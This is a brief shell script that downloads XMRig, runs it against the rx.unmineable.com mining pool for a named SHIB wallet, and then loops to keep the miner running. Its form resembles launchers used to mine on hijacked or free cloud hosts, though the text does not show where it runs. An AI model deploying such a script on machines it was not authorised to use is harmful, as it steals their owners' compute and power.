#!/bin/sh
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
tar xf xmrig-6.15.1-linux-x64.tar.gz
cd xmrig-6.15.1
./xmrig -o rx.unmineable.com:3333 -u -a rx -k -u SHIB:0xae3c3c54230763a0886b3bd625dc292d891d75bb.DUA -p x
while [ 1 ]; do
sleep 3
done
sleep 999
